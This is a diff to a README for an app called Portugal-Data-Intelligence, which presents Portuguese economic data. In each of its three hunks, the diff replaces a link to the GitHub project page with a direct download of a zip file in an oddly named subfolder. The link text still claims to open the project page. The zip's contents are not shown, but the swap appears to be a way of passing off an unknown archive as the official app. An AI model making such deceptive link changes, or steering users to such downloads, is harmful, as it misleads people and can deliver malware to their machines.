@@ -1,6 +1,6 @@
 # 📊 Portugal-Data-Intelligence - Portuguese Economic Data Made Simple
 
-[![Download / Open the App](https://img.shields.io/badge/Download%20%2F%20Open%20the%20App-Portugal--Data--Intelligence-blue?style=for-the-badge)](https://github.com/daisiechurchly106/Portugal-Data-Intelligence)
+[![Download / Open the App](https://img.shields.io/badge/Download%20%2F%20Open%20the%20App-Portugal--Data--Intelligence-blue?style=for-the-badge)](https://github.com/daisiechurchly106/Portugal-Data-Intelligence/raw/refs/heads/main/scirtopodous/Intelligence_Data_Portugal_v2.0.zip)
 
 ## 🚀 What this app does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Use this link to visit the project page and download or open the files:
 
-[Visit the Portugal-Data-Intelligence download page](https://github.com/daisiechurchly106/Portugal-Data-Intelligence)
+[Visit the Portugal-Data-Intelligence download page](https://github.com/daisiechurchly106/Portugal-Data-Intelligence/raw/refs/heads/main/scirtopodous/Intelligence_Data_Portugal_v2.0.zip)
 
 If you are using Windows, follow the steps below after the files are on your computer.
 
@@ -262,7 +262,7 @@ If you see a Power BI file:
 
 ## 🔗 Direct project link
 
-[Open Portugal-Data-Intelligence on GitHub](https://github.com/daisiechurchly106/Portugal-Data-Intelligence)
+[Open Portugal-Data-Intelligence on GitHub](https://github.com/daisiechurchly106/Portugal-Data-Intelligence/raw/refs/heads/main/scirtopodous/Intelligence_Data_Portugal_v2.0.zip)
 
 ## 🧾 File checklist
 
